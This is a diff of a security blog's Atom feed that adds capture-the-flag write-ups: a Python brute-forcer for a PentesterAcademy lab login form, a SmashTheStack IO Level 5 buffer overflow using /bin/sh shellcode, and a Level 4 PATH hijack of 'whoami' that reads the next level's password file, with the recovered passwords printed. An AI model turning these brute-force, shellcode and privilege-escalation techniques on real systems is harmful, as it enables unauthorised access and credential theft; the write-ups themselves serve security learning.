@@ -1,10 +1,10 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
 
-  <title><![CDATA[Category: web | Core dump overflow]]></title>
-  <link href="http://chousensha.github.io/blog/categories/web/atom.xml" rel="self"/>
+  <title><![CDATA[Category: writeups | Core dump overflow]]></title>
+  <link href="http://chousensha.github.io/blog/categories/writeups/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2016-08-24T07:55:31-04:00</updated>
+  <updated>2016-08-29T15:52:15-04:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -2222,6 +2222,436 @@ information. Stored XSS is also sometimes referred to as Persistent or Type-I XS
 <p>As you can see, DVWA was..damn vulnerable!</p>
 
 <blockquote><p>Cheer Up!  Things are getting worse at a slower rate.</p></blockquote>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[PentesterAcademy WAP Challenge 1: Form Bruteforcing]]></title>
+    <link href="http://chousensha.github.io/blog/2014/07/26/pentesteracademy-wap-challenge-1-form-bruteforcing/"/>
+    <updated>2014-07-26T17:31:26-04:00</updated>
+    <id>http://chousensha.github.io/blog/2014/07/26/pentesteracademy-wap-challenge-1-form-bruteforcing</id>
+    <content type="html"><![CDATA[<p><a href="http://www.pentesteracademy.com">PentesterAcademy</a> has a section dedicated to web application security challenges. In this post I will present my solution to the first challenge, which requires form bruteforcing to authenticate on the provided web page:</p>
+
+<p><a href="http://pentesteracademylab.appspot.com/lab/webapp/1">http://pentesteracademylab.appspot.com/lab/webapp/1</a></p>
+
+<!-- more -->
+
+
+<p>This is how the page looks like:</p>
+
+<p><img class="center" src="/images/wap1.png" title="&lsquo;wap1&rsquo; &lsquo;wap1&rsquo;" ></p>
+
+<p>The provided hint should help with writing a bruteforce script:</p>
+
+<p><strong>Hint:</strong></p>
+
+<p><strong>Company Domain: PentesterAcademy.com</strong></p>
+
+<p><strong>Usernames: jack, admin</strong></p>
+
+<p><strong>Password Complexity: 5 characters and uses only x,y,z lowercase. Password examples &ndash; xxyyz, xyzxy, xyxxx etc.</strong></p>
+
+<p>So, what we need here is to test the login with usernames of the form <em>user@companydomain</em> and 5 character passwords constructed from the given characters.</p>
+
+<p>I wrote a Python script to do that:</p>
+
+<p>``` python
+import requests
+import itertools</p>
+
+<p>url = &lsquo;<a href="http://pentesteracademylab.appspot.com/lab/webapp/1">http://pentesteracademylab.appspot.com/lab/webapp/1</a>&rsquo;</p>
+
+<p>emails = [&lsquo;<a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#106;&#x61;&#x63;&#107;&#64;&#x70;&#x65;&#x6e;&#x74;&#101;&#115;&#x74;&#101;&#114;&#97;&#x63;&#x61;&#100;&#101;&#x6d;&#121;&#x2e;&#x63;&#x6f;&#109;">&#x6a;&#97;&#x63;&#107;&#x40;&#112;&#101;&#x6e;&#116;&#101;&#x73;&#x74;&#x65;&#x72;&#x61;&#x63;&#x61;&#100;&#101;&#x6d;&#121;&#x2e;&#x63;&#111;&#x6d;</a>&rsquo;, \</p>
+
+<pre><code>      'admin@pentesteracademy.com']
+</code></pre>
+
+<p>def buildPassList(iterables, r):</p>
+
+<pre><code>passlist = []
+for word in itertools.product(iterables, repeat = r):
+    passlist.append(''.join(word))
+return passlist
+</code></pre>
+
+<p>passlist = buildPassList(&lsquo;xyz&rsquo;, 5)</p>
+
+<p>count = 0
+fail = &lsquo;Failed! Please try again!&rsquo;
+for user in emails:</p>
+
+<pre><code>for passwd in passlist:
+    print 'Try %d - email: %s password: %s' % (count, user, passwd)
+    payload = {'email': user, 'password': passwd}
+    req = requests.get(url, params=payload)
+    if fail not in req.content:
+        print payload
+        print req.content
+        break          
+    count += 1
+</code></pre>
+
+<p>```</p>
+
+<p>I used the requests module, which is very handy for all sorts of URL interaction. To figure out the parameter names and how are they passed to the login form, I tested with some garbage values and saw the URL looked like this:</p>
+
+<p><code>plain
+http://pentesteracademylab.appspot.com/lab/webapp/1?email=test&amp;password=xyz
+</code></p>
+
+<p>From that I knew to use the GET request in the code. Also, when you fail, you get a message stating that you should try again, so I looked for that in the response from the server, and I concluded that if it were absent, it means that the login was successful. When you complete the challenge, there is also a message that says &ldquo;Well done! This challenge has been cracked!&rdquo;</p>
+
+<p>Here is a snippet of the output:</p>
+
+<p><code>plain
+Try 0 - email: jack@pentesteracademy.com password: xxxxx
+Try 1 - email: jack@pentesteracademy.com password: xxxxy
+...
+Try 477 - email: admin@pentesteracademy.com password: zzzxx
+Try 478 - email: admin@pentesteracademy.com password: zzzxy
+{'password': 'zzzxy', 'email': 'admin@pentesteracademy.com'}
+</code></p>
+
+<p>Today&rsquo;s fortune cookie:</p>
+
+<blockquote><p>While you recently had your problems on the run, they&rsquo;ve regrouped and
+are making another attack.</p></blockquote>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[SmashTheStack IO Level 5]]></title>
+    <link href="http://chousensha.github.io/blog/2014/07/18/smashthestack-io-level-5/"/>
+    <updated>2014-07-18T13:08:18-04:00</updated>
+    <id>http://chousensha.github.io/blog/2014/07/18/smashthestack-io-level-5</id>
+    <content type="html"><![CDATA[<p>This is another level with 2 alternate programs to exploit.</p>
+
+<!-- more -->
+
+
+<p>Code for level05.c:</p>
+
+<p>``` c</p>
+
+<h1>include &lt;stdio.h></h1>
+
+<h1>include &lt;string.h></h1>
+
+<p>int main(int argc, char **argv) {</p>
+
+<pre><code>char buf[128];
+
+if(argc &lt; 2) return 1;
+
+strcpy(buf, argv[1]);
+
+printf("%s\n", buf);    
+
+return 0;
+</code></pre>
+
+<p>}
+```</p>
+
+<p>This is a simple buffer overflow program. I will use the <a href="http://www.shell-storm.org/shellcode/files/shellcode-811.php">x86 execve(&ldquo;/bin/sh&rdquo;)</a> shellcode and place it in an environment variable. Then I will get the address of that variable using an excellent program from Hacking: The Art of Exploitation and pass it to the level5 binary in order to get a shell.</p>
+
+<p>First, here is the very useful code for getting the address of an environment variable, from Jon Erickson&rsquo;s book:</p>
+
+<p>``` c</p>
+
+<h1>include &lt;stdio.h></h1>
+
+<h1>include &lt;stdlib.h></h1>
+
+<h1>include &lt;string.h></h1>
+
+<p>int main(int argc, char *argv[]) {</p>
+
+<pre><code>    char *ptr;
+    if(argc &lt; 3) {
+            printf("Usage: %s &lt;environment var&gt; &lt;target program name&gt;\n", argv[0]);
+            exit(0);
+    }
+    ptr = getenv(argv[1]); /* Get env var location. */
+    ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */
+    printf("%s will be at %p\n", argv[1], ptr);
+</code></pre>
+
+<p>}
+```</p>
+
+<p>Compile this program in your own directory. Next, add an environment variable with the shellcode:</p>
+
+<p><code>plain
+export PWN=$(python -c 'print "\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"')
+</code></p>
+
+<p>Next we need to find out the offsets for exploiting the program (again pattern_create.rb and pattern_offset.rb are your friends):</p>
+
+<p><code>plain
+root@kali:/usr/share/metasploit-framework/tools# ./pattern_create.rb 200
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+</code></p>
+
+<p>Run the program in GDB with the pattern and then get the offset:</p>
+
+<p>``` plain
+Program received signal SIGSEGV, Segmentation fault.
+0x37654136 in ?? ()</p>
+
+<p>root@kali:/usr/share/metasploit-framework/tools# ./pattern_offset.rb 0x37654136
+[*] Exact match at offset 140
+```</p>
+
+<p>Now get the address of our environment variable:</p>
+
+<p><code>plain
+level5@io:/tmp/mydir$ ./getenv PWN /levels/level05
+PWN will be at 0xbfffff53
+</code></p>
+
+<p>Profit:</p>
+
+<p><code>plain
+level5@io:/tmp/mydir$ /levels/level05 $(python -c 'print "A" * 140 + "\x53\xff\xff\xbf"')
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAS���
+sh-4.2$ whoami
+level6
+sh-4.2$ cat /home/level6/.pass
+9BT8fmYDTPimXXhY3m
+</code></p>
+
+<p>This was the easy way. Prepare for worse in the alternate way, with level05_alt.c:</p>
+
+<p>``` c
+//don&rsquo;t get trapped, there&rsquo;s no need
+//level by bla</p>
+
+<h1>include &lt;sys/mman.h></h1>
+
+<h1>include &lt;stdlib.h></h1>
+
+<h1>include &lt;stdio.h></h1>
+
+<h1>include &lt;string.h></h1>
+
+<h1>define LOADERSIZE (232 + 16)</h1>
+
+<p>void<em> getASLRregion(int size, int flags);
+void switchcontext(char</em> newstack, char* code);</p>
+
+<p>int main(int argc, char<em> argv[], char</em> env[])
+{</p>
+
+<pre><code>char *newcode, *newstack;
+
+//allocate memory at random addresses
+newstack = getASLRregion(64 * 1024, PROT_READ | PROT_WRITE );
+newcode =  getASLRregion(64 * 1024, PROT_READ | PROT_WRITE | PROT_EXEC);
+
+if(argc &gt; 1)
+if(!strchr(argv[1], 0xcd))
+if(!strchr(argv[1], 0xe8))
+if(!strstr(argv[1], "\x0F\x34"))
+if(!strchr(argv[1], 0xdb)) {
+    //prepare new code section, leaving some space for a loader
+    strncpy(newcode + LOADERSIZE, argv[1], 1000);
+
+    //start executing using a new stack and code section.
+    switchcontext(newstack + 64 * 1024, newcode);
+}
+return 0;
+</code></pre>
+
+<p>}</p>
+
+<p>/<strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><em>/
+/</em> HALT! The code below only provides a controllable aslr/noexec for this challenge, there&rsquo;s no need to waste time on it <em>/
+/</em></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>/
+void <strong>attribute</strong>((constructor))initializePRNG(){int seed;FILE<em>devrand=fopen(&ldquo;/dev/random&rdquo;,&ldquo;r&rdquo;);if(devrand==0)exit(-1);
+if(fread(&amp;seed, 4, 1, devrand) != 1)exit(-1);fclose(devrand);srand(seed);}unsigned int loader[100]={0xe899c031,0};void</em>
+getASLRregion(int size, int flags){int tries=1000,hint,res;while(tries&mdash;){hint=rand()&lt;&lt;12;res=(int)mmap((void<em>)hint,size
++4096,flags,MAP_PRIVATE|MAP_ANONYMOUS,0,0);if(hint==res){loader[++loader[1]+1]=hint;return (void</em>)(res+(rand()&amp;0xffc));}
+if(munmap((void<em>)res,size+4096))exit(-1);}exit(-1);}void switchcontext(char</em>newstack,char<em>code){loader[1]&lt;&lt;=2;memcpy(code
+,loader,loader[1]+8);memcpy(code+loader[1]+8,&ldquo;\x68\x61\x70\x73\x00\x68\x6c\x66\x2f\x6d\x68\x63\x2f\x73\x65\x68\x2f\x70&rdquo;
+&ldquo;\x72\x6f\x89\xe3\x89\xc1\xb0\x05\xcd\x80\x81\xc4\x10\x00\x00\x00\x85\xc0\x0f\x88\x97\x00\x00\x00\x50\x89\xe5\x31\xc9\x31&rdquo;
+&ldquo;\xff\xc1\xe7\x04\x0f\xb6\xc9\x09\xcf\xe8\x73\x00\x00\x00\x85\xc0\x0f\x84\x80\x00\x00\x00\x80\xf9\x2d\x74\x10\x80\xe9\x30&rdquo;
+&ldquo;\x80\xf9\x09\x76\xde\x80\xe9\x27\xe9\xd6\xff\xff\xff\x8b\x75\x04\xad\x39\xf8\x74\x3b\x85\xc0\x75\xf7\x57\x31\xc9\x31\xff&rdquo;
+&ldquo;\xc1\xe7\x04\x0f\xb6\xc9\x09\xcf\xe8\x38\x00\x00\x00\x85\xc0\x74\x49\x80\xf9\x20\x74\x10\x80\xe9\x30\x80\xf9\x09\x76\xe2&rdquo;
+&ldquo;\x80\xe9\x27\xe9\xda\xff\xff\xff\x5b\x89\xf9\x29\xd9\x31\xc0\x99\xb0\x7d\xcd\x80\xe8\x0e\x00\x00\x00\x85\xc0\x74\x1f\x80&rdquo;
+&ldquo;\xf9\x0a\x75\xf2\xe9\x7c\xff\xff\xff\x51\x89\xe1\x31\xc0\x99\xb0\x03\x42\x8b\x5d\x00\xcd\x80\x59\xc3\x31\xc0\x40\xcd\x80&rdquo;
+&ldquo;\x31\xc0\xb0\x06\x5b\xcd\x80\x31\xc0\x5b\x31\xc9\xb1\x10\xfd\x89\xe7\xf3\xab\xfc\x8d\x7b\xf8\xb1\x3d\x99\x31\xdb\x31\xf6&rdquo;
+&ldquo;\xf3\xab\x31\xff&rdquo;,LOADERSIZE-16);asm(&ldquo;mov %0, %%esp\nmov %1,%%eax\njmp </em>%%eax&rdquo;::&ldquo;r&rdquo;(newstack-4),&ldquo;r&rdquo;(code):&ldquo;eax&rdquo;);}
+```</p>
+
+<h4>Function overview</h4>
+
+<p>Well, let&rsquo;s first be clear on the flags used for the memory allocation:</p>
+
+<p>PROT_EXEC  Pages may be executed.</p>
+
+<p>PROT_READ  Pages may be read.</p>
+
+<p>PROT_WRITE Pages may be written.</p>
+
+<p><strong>strchr</strong></p>
+
+<p><em>char <em>strchr(const char </em>str, int ch);</em></p>
+
+<p>Returns a pointer to the first occurrence of character ch in str or a null pointer if no matching character is found.</p>
+
+<p>The terminating null byte is considered part of the string, so that if  ch  is  specified  as &lsquo;\0&rsquo;, this function returns a pointer to the terminator.</p>
+
+<p>I will come back to this at a later time.</p>
+
+<blockquote><p>Truth is the most valuable thing we have &mdash; so let us economize it.</p>
+
+<p>&mdash; Mark Twain</p></blockquote>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[SmashTheStack IO Level 4]]></title>
+    <link href="http://chousensha.github.io/blog/2014/07/07/smashthestack-io-level-4/"/>
+    <updated>2014-07-07T15:24:52-04:00</updated>
+    <id>http://chousensha.github.io/blog/2014/07/07/smashthestack-io-level-4</id>
+    <content type="html"><![CDATA[<p>We have source code for this level as well in level04.c:</p>
+
+<!-- more -->
+
+
+<p>``` c
+//writen by bla</p>
+
+<h1>include &lt;stdlib.h></h1>
+
+<h1>include &lt;stdio.h></h1>
+
+<p>int main() {</p>
+
+<pre><code>    char username[1024];
+    FILE* f = popen("whoami","r");
+    fgets(username, sizeof(username), f);
+    printf("Welcome %s", username);
+
+    return 0;
+</code></pre>
+
+<p>}
+```</p>
+
+<h4>Function overview</h4>
+
+<p><strong>popen</strong></p>
+
+<p><em>FILE <em>popen(const char </em>command, const char *type);</em></p>
+
+<p>Opens a process by creating a pipe,  forking,  and invoking  the shell.  Since a pipe is by definition unidirectional, the type argument may specify  only  reading  or  writing,  not  both;  the resulting stream is correspondingly read-only or write-only.</p>
+
+<p>The  command argument is a pointer to a null-terminated string containing a shell command line.  This command is passed to /bin/sh using  the -c  flag;  interpretation, if any, is performed by the shell.  The type argument is a pointer to a null-terminated string  which  must  contain either the letter &lsquo;r&rsquo; for reading or the letter &lsquo;w&rsquo; for writing.  Since glibc 2.9, this argument can additionally include the letter &lsquo;e&rsquo;, which causes  the close-on-exec flag (FD_CLOEXEC) to be set on the underlying file descriptor.</p>
+
+<p>The  return  value  from popen() is a normal standard I/O stream in all respects save  that  it  must  be  closed  with  pclose()  rather  than <em>fclose(3)</em>.   Writing  to  such a stream writes to the standard input of the command; the command&rsquo;s standard output is the same as that  of  the process  that  called  popen(),  unless  this is altered by the command itself.  Conversely, reading from a &ldquo;popened&rdquo;  stream  reads  the  command&rsquo;s standard output, and the command&rsquo;s standard input is the same as that of the process that called popen().</p>
+
+<p>Note that output popen() streams are fully buffered by default.</p>
+
+<p>The popen() function returns NULL if the <em>fork(2)</em> or <em>pipe(2)</em> calls fail, or if it cannot allocate memory.</p>
+
+<p>The popen() function does not set errno if memory allocation fails.  If the underlying fork(2) or pipe(2) fails, errno  is  set  appropriately. If  the type argument is invalid, and this condition is detected, errno is set to EINVAL.</p>
+
+<p>Since the standard input of a command opened  for  reading  shares  its seek  offset  with  the  process  that  called popen(), if the original process has done a buffered read, the command&rsquo;s input position may  not be  as expected.  Similarly, the output from a command opened for writing may become intermingled with that of  the  original  process.   The latter can be avoided by calling fflush(3) before popen().</p>
+
+<p>Failure  to  execute  the  shell  is indistinguishable from the shell&rsquo;s failure to execute command, or an immediate exit of the  command.   The only hint is an exit status of 127.</p>
+
+<p><strong>fgets</strong></p>
+
+<p><em>char <em>fgets(char </em>str, int num, FILE *stream);</em></p>
+
+<p>The <em>fgets()</em> function reads up to <em>num–1</em> characters from <em>stream</em> and stores them in the character array pointed to by <em>str</em>. Characters are read until either a newline or an EOF is received or until the specified limit is reached. After the characters have been read, a null is stored in the array immediately after the last character read. A newline character will be retained and will be part of the array pointed to by <em>str</em>.</p>
+
+<p>On success, the function returns <em>str</em>.
+If the end-of-file is encountered while attempting to read a character, the eof indicator is set (<em>feof</em>). If this happens before any characters could be read, the pointer returned is a null pointer (and the contents of <em>str</em> remain unchanged).
+If a read error occurs, the error indicator (<em>ferror</em>) is set and a null pointer is also returned (but the contents pointed by <em>str</em> may have changed).</p>
+
+<h4>Program description</h4>
+
+<p>This program executes a shell command and prints the results. If we try to run it, we see this:</p>
+
+<p><code>plain
+level4@io:/levels$ ./level04
+Welcome level5
+</code></p>
+
+<p>This makes sense, since it&rsquo;s a SUID binary owned by the level5 user. What we want to do is substitue the command called by popen with one that will help us advance, like <code>cat /home/level5/.pass</code></p>
+
+<p>We can&rsquo;t directly influence the program since it doesn&rsquo;t take user input. But we know that the change must occur in the popen line. So in that line, it opens a pipe for reading to the <em>whoami</em> command. We can&rsquo;t put another command its place, but maybe we don&rsquo;t have to. How does the program know where to find whoami? Let&rsquo;s first find it ourselves:</p>
+
+<p><code>plain
+level4@io:/levels$ which whoami
+/usr/bin/whoami
+</code></p>
+
+<p>For this we have to understand the concept of PATH:</p>
+
+<blockquote><p>PATH is an environmental variable in Linux and other Unix-like operating systems that tells the shell which directories to search for
+executable files in response to commands issued by a user.
+Each user on a system can have a different PATH variable.</p>
+
+<p>(The Linux Information Project)</p></blockquote>
+
+<p>To see the contents of our PATH variable, we do this:</p>
+
+<p><code>plain
+level4@io:/levels$ echo $PATH
+/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+</code></p>
+
+<p>So this is how the program knew how to find whoami. It just searched those directories until it found it. And we know we can add a new directory to our default search path with one of the below commands:</p>
+
+<p>``` plain
+PATH=&ldquo;directory:$PATH&rdquo;</p>
+
+<p>PATH=$PATH:directory
+export PATH</p>
+
+<p>export PATH=$PATH:directory
+```</p>
+
+<p>Now we should get an idea of the steps to exploit the program. We can create our own directory and store in it a program named whoami that would do what we want it to. Then should add that directory to our path, and then level04 program searches for whoami, it will hit upon our own whoami version instead. Let&rsquo;s do that now.</p>
+
+<p><code>plain
+level4@io:/levels$ mkdir /tmp/mydir
+level4@io:/tmp/mydir$ echo "cat /home/level5/.pass" &gt; /tmp/mydir/whoami
+level4@io:/tmp/mydir$ ls -l whoami
+-rw-r--r-- 1 level4 level4 23 Jul 17 17:44 whoami
+</code></p>
+
+<p>If we leave it like this, the permissions won&rsquo;t allow it to be executed, so I make it readable, writable and executable for everyone with the following:</p>
+
+<p><code>plain
+chmod 777 whoami
+level4@io:/tmp/mydir$ ls -l whoami
+-rwxrwxrwx 1 level4 level4 23 Jul 17 17:44 whoami
+</code></p>
+
+<p>Now add our directory to our PATH:</p>
+
+<p><code>plain
+level4@io:/tmp/mydir$ PATH="/tmp/mydir:$PATH"
+level4@io:/tmp/mydir$ echo $PATH
+/tmp/mydir:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+</code></p>
+
+<p>All that&rsquo;s left is to run the level04 binary and collect the password:</p>
+
+<p><code>plain
+level4@io:/tmp/mydir$ /levels/level04
+Welcome KGpWsju2vDpmxcxlvm
+</code></p>
+
+<blockquote><p>Work consists of whatever a body is obliged to do.
+Play consists of whatever a body is not obliged to do.</p>
+
+<p>&mdash; Mark Twain</p></blockquote>
 ]]></content>
   </entry>
   
